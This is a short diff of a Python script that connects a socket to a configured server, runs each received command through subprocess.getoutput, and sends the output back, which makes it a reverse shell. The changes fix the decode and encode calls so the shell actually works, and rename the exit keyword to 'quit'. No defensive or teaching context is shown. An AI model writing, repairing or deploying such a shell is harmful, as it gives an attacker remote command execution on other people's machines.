@@ -6,9 +6,9 @@ buffer = 1024
 s = socket.socket()
 s.connect((sever,port))
 while True:
-    command = s.recv(buffer).decode
-    if command.lower() == "exit":
+    command = s.recv(buffer).decode()
+    if command.lower() == "quit":
         break
     output = subprocess.getoutput(command)
-    s.send(output.encode)
+    s.send(output.encode())
 s.close()
